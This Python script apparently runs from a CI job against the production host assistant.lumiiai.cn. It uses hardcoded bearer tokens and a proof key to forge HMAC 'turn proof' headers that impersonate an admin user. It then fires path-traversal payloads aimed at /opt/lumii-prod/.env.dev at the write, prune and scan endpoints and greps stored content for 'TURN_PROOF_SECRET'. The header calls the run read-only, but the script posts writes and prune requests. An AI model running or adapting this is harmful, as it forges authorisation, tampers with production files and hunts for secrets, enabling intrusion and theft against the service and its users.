#!/usr/bin/env python3
# intent 28664 — enumerate Lumii /internal/sediment/* auth + path handling in prod (read-only/low-risk).
# Determines whether the sediment surface can be an arbitrary-file read channel (e.g. /opt/lumii-prod/.env.dev).
import os, sys, json, time, base64, hmac, hashlib, subprocess

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)

HOST = "assistant.lumiiai.cn"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
RID = "rt_KTWyBZUur4cjUsRGP3zRk"
RTOKEN = "jy3151agR2zGGHQ08X_m52K04nsfiVsYi7LEJNDRE4Q"
PROOF_KEY_FALLBACK = "CntmKUfWiId2whBB7yGfPu5nKcKzmwUeKGGcWFGUVr8"
ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
START = time.time()

def log(*a):
    print(" ".join(str(x) for x in a), flush=True)

def el(): return int(time.time() - START)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def curl_raw(args, timeout=40):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 20)
        return r.returncode, r.stdout, r.stderr[:400]
    except Exception as e:
        return -1, b"", repr(e)[:300]

def call(path, method="GET", body=None, hdrs=None, timeout=40, maxlen=2500):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json",
            "-H", "Origin: https://%s" % HOST, "-H", "Referer: https://%s/" % HOST,
            "-w", "\n__CODE__%{http_code}"]
    for k, v in (hdrs or {}).items():
        args += ["-H", "%s: %s" % (k, v)]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = curl_raw(args, timeout=timeout)
    txt = out.decode("utf-8", "replace")
    code = ""
    i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"path": path, "code": code, "body": txt[:maxlen], "len": len(txt),
            "err": err.decode("utf-8", "replace") if isinstance(err, (bytes, bytearray)) else str(err)}

def R(k, v):
    try: s = json.dumps(v, ensure_ascii=False) if not isinstance(v, str) else v
    except Exception: s = str(v)
    log("R:%s:%s" % (k, s[:2000]))

MH = {"Authorization": "Bearer " + RTOKEN, "x-agent-id": RID}

# ---------- P0 identity + proof key ----------
log("### P0 identity t=%ds" % el())
PROOF_KEY = None
for attempt in range(4):
    k = call("/api/runtimes/keys/current", hdrs={"x-agent-id": RID, "x-agent-token": RTOKEN})
    try:
        kj = json.loads(k["body"]); pk = kj.get("proof_key")
        if pk:
            PROOF_KEY = pk; log("[keys] code=%s proof_key=%s ver=%s" % (k["code"], pk, kj.get("proof_key_version"))); break
    except Exception:
        log("[keys] retry %d code=%s body=%s" % (attempt, k["code"], k["body"][:160]))
    time.sleep(3)
if not PROOF_KEY:
    PROOF_KEY = PROOF_KEY_FALLBACK; log("[keys] fallback proof_key")
R("P0_keys", {"code": k["code"], "proof_key": PROOF_KEY})

now = int(time.time())
def v2_proof(actor=ADMIN, platform="dashboard"):
    sk = "conv_" + actor[-8:]
    payload = {"platform": platform, "session_key": sk, "actor_id": actor,
               "chat_id": sk, "iss": RID, "aud": RID, "iat": now, "exp": now + 3600}
    pb = b64u(json.dumps(payload, separators=(',', ':')))
    sig = hmac.new(PROOF_KEY.encode(), pb.encode(), hashlib.sha256).digest()
    return "v2." + pb + "." + b64u(sig)
def hdr_for(actor=ADMIN):
    h = dict(MH); h["x-lumii-turn-proof"] = v2_proof(actor); return h

# ---------- P1 machine-only endpoints (no proof) ----------
log("### P1 machine-class GET t=%ds" % el())
for pth in ["/internal/sediment/where", "/internal/sediment/health"]:
    r = call(pth, "GET", hdrs=MH)
    R("P1_GET_" + pth.rsplit("/", 1)[-1], {"code": r["code"], "body": r["body"][:600]})

# ---------- P2 write path-traversal rejection ----------
log("### P2 write traversal t=%ds" % el())
traversals = [
    "../../../.env.dev",
    "/opt/lumii-prod/.env.dev",
    "..%2f..%2f..%2f.env.dev",
    "%2e%2e/%2e%2e/%2e%2e/.env.dev",
    "....//....//....//.env.dev",
    "a/../../../../opt/lumii-prod/.env.dev",
    "..\\..\\..\\.env.dev",
]
for i, rp in enumerate(traversals):
    r = call("/internal/sediment/write", "POST",
             {"org_id": ORG, "folder_node_id": "probe28664nofolder", "sub": "raw",
              "rel_path": rp, "content": "X"}, MH)
    R("P2_write_%d" % i, {"rel_path": rp, "code": r["code"], "body": r["body"][:300]})
# folder_node_id traversal inside write (absOf validates folder segment via parse)
r = call("/internal/sediment/write", "POST",
         {"org_id": ORG, "folder_node_id": "../../../../opt/lumii-prod", "sub": "raw",
          "rel_path": "x.md", "content": "X"}, MH)
R("P2_write_folder_traversal", {"code": r["code"], "body": r["body"][:300]})
# sub not in whitelist
r = call("/internal/sediment/write", "POST",
         {"org_id": ORG, "folder_node_id": "probe28664nofolder", "sub": "../etc",
          "rel_path": "x.md", "content": "X"}, MH)
R("P2_write_bad_sub", {"code": r["code"], "body": r["body"][:300]})

# ---------- P3 prune: does it validate folder_node_id / path? (NON-EXISTENT target only) ----------
log("### P3 prune validation t=%ds" % el())
for idx, fnid in enumerate(["probe28664_nonexistent_zzz",
                            "../../../../../../../tmp/probe28664_nonexistent_zzz"]):
    r = call("/internal/sediment/prune", "POST",
             {"org_id": ORG, "folder_node_id": fnid, "sub": "raw", "keep": []}, MH)
    R("P3_prune_%d" % idx, {"folder_node_id": fnid, "code": r["code"], "body": r["body"][:300]})

# ---------- P4 scan folder validation ----------
log("### P4 scan t=%ds" % el())
for idx, fnid in enumerate(["../../../../opt", "probe28664_nonexistent_zzz"]):
    r = call("/internal/sediment/scan", "POST",
             {"org_id": ORG, "folder_node_id": fnid}, MH)
    R("P4_scan_%d" % idx, {"folder_node_id": fnid, "code": r["code"], "body": r["body"][:300]})

# ---------- P5 grep: turn-class gate + confinement ----------
log("### P5 grep t=%ds" % el())
r = call("/internal/sediment/grep", "POST", {"org_id": ORG, "q": "LUMII", "limit": 3}, MH)
R("P5_grep_noproof", {"code": r["code"], "body": r["body"][:300]})
r = call("/internal/sediment/grep", "POST", {"org_id": ORG, "q": "LUMII", "limit": 3, "subs": ["smart_notes"]}, hdr_for())
R("P5_grep_proof", {"code": r["code"], "body": r["body"][:1200]})
r = call("/internal/sediment/grep", "POST", {"org_id": ORG, "q": "LUMII", "limit": 3, "subs": ["doc_notes"]}, hdr_for())
R("P5_grep_badsub", {"code": r["code"], "body": r["body"][:300]})
# probe whether secrets leaked into sediment markdown
r = call("/internal/sediment/grep", "POST", {"org_id": ORG, "q": "TURN_PROOF_SECRET", "limit": 20}, hdr_for())
R("P5_grep_secret", {"code": r["code"], "body": r["body"][:800]})
r = call("/internal/sediment/doc-notes-grep", "POST", {"org_id": ORG, "q": "LUMII", "limit": 3}, MH)
R("P5_docnotes_noproof", {"code": r["code"], "body": r["body"][:300]})

# ---------- P6 pending-wiki / pending-chats (machine) existence + shape ----------
log("### P6 pending t=%ds" % el())
r = call("/internal/sediment/pending-wiki", "POST", {"org_id": ORG, "limit": 3}, MH)
R("P6_pending_wiki", {"code": r["code"], "body": r["body"][:800]})
r = call("/internal/sediment/pending-chats", "POST", {"org_id": ORG, "limit": 3}, MH)
R("P6_pending_chats", {"code": r["code"], "body": r["body"][:800]})

log("### DONE t=%ds" % el())
